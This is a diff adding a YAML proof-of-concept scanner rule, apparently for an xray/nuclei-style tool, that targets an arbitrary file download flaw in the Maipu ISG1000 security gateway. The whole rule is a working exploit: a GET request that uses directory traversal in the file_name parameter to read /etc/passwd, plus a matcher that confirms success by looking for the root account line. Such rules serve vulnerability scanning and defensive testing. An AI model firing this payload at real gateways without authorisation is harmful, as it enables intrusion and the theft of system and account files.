@@ -1,0 +1,11 @@
+name: poc-yaml-mpsec-isg1000-file-read
+rules:
+  - method: GET
+    path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
+    expression: |
+      response.status == 200 && response.content_type.contains("text/plain") && response.headers["set-cookie"].contains("USGSESSID=") && "root:[x*]?:0:0:".bmatches(response.body)
+detail:
+  author: YekkoY
+  description: "迈普 ISG1000安全网关 任意文件下载漏洞"
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%BF%88%E6%99%AE/%E8%BF%88%E6%99%AE%20ISG1000%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html?h=isg1000
